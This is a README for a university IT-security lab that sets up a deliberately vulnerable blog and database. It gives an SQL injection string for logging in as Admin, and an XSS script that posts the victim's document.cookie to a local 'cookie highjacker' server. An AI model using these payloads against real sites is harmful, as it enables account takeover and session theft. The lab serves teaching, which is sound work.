# hse-ss22-itsec-lab-1

## Setup

### Database
Run ````docker-compose up```` to start the MySQL Database. On startup it will be populated with the schema.sql and data.sql scripts.

SQL Injection Attack vector ````' OR 1=1 AND username='Admin';-- ````

### Application
The Actual Application which runs the Blog can be started with 
* ````npm run dev```` which will apply code changes automatically.
* ````npm start```` which will not apply any code changes.

### Cookie Highjacker
The Cookie Highjacker is a simple implementation of an express server which only accepts the root route and prints the highjacked cookie to the console.

Script to sniff the cookie.
````
<script>
    alert('Smells like XSS');
    fetch("http://localhost:7000/", {
        method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({cookie: document.cookie})
    });
</script>
````

